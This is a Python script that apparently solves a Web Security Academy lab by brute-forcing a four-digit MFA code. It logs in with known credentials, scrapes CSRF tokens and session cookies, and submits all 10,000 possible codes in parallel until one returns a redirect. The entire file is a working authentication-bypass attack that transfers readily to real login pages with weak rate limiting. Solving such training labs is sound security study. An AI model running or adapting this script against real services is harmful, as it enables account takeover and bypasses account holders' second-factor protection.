#!/usr/bin/python3

import requests
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from multiprocessing import Pool, freeze_support

# NOTE: session needs to be passed down along requests
url = 'https://0a5800e703e1a4cbc054374700510088.web-security-academy.net'
urlForLoginPage = url + '/login'
urlForTokenPage = url + '/login2'

headerObj = {
    "Content-Type": "application/x-www-form-urlencoded"
}


def bruteForceLoginAndToken(tokenParam):
    httpPostResponse1 = requests.get(urlForLoginPage, headers = headerObj, verify=True)
    csrfValue = re.search("value=\".*\"", httpPostResponse1.text).group().split("\"")[1]  # value="9JUbKMe7KvPkL7QL2cdV3nOheJZKZFb9"
    cookieValue = httpPostResponse1.headers['Set-Cookie']
    sessionValue = re.search("session=.*", cookieValue).group().split("=")[1].split(";")[0]


    cookieObj = {
        "session": sessionValue
    }

    dataObj = {
        'username': 'carlos',
        'password': 'montoya',
        'csrf': csrfValue
    }

    httpPostResponse2 = requests.post(urlForLoginPage, data = dataObj, headers = headerObj, cookies = cookieObj, verify=True, allow_redirects=False) # get the session id before redirect
    cookieValueAfterLogin = httpPostResponse2.headers['Set-Cookie']
    sessionValueAfterLogin = re.search("session=.*", cookieValueAfterLogin).group().split("=")[1].split(";")[0]


    # NOTE: after successful login, session id changes
    cookieObj = {
        "session": sessionValueAfterLogin
    }
    httpPostResponse3 = requests.get(urlForTokenPage, headers = headerObj, cookies = cookieObj, verify=True)
    csrfValueOnTokenPage = re.search("value=\".*\"", httpPostResponse3.text).group().split("\"")[1]  # value="YS30QyKrwhKL1sEYDAzMQNr9onCxPvS6"


    dataObj = {
        'mfa-code': tokenParam, 
        'csrf': csrfValueOnTokenPage
    }
    httpPostResponse4 = requests.post(urlForTokenPage, data = dataObj, headers = headerObj, cookies = cookieObj, verify=True)
    print('token: ' + tokenParam)
    print('status: ' + str(httpPostResponse4.status_code))
    print('url: ' + httpPostResponse4.url)
    print(httpPostResponse4.headers)
    #print(httpPostResponse4.text)
    if httpPostResponse4.status_code == 302:
        f = open("RESULT.txt", "w")
        f.write(httpPostResponse4.status_code)
    return tokenParam + ' ' + str(httpPostResponse4.status_code)
        

'''
def runThread(): 
    threadArr = []
    with ThreadPoolExecutor(max_workers=8) as executor: 
        for i in range(10000):
            token = str(i).zfill(4)
            bruteForceLoginAndToken(token)
            threadArr.append(executor.submit(token))
    concurrent.futures.wait(threadArr)
    if False:
        for task in as_completed(threadArr):
            print(task.result()) 

runThread()
'''

def main():
    tokenArr = [str(i).zfill(4) for i in range(10000)]
    pool = Pool(8)
    results = pool.map(bruteForceLoginAndToken, tokenArr)
    print(results)

if __name__=="__main__":
    freeze_support()
    main()
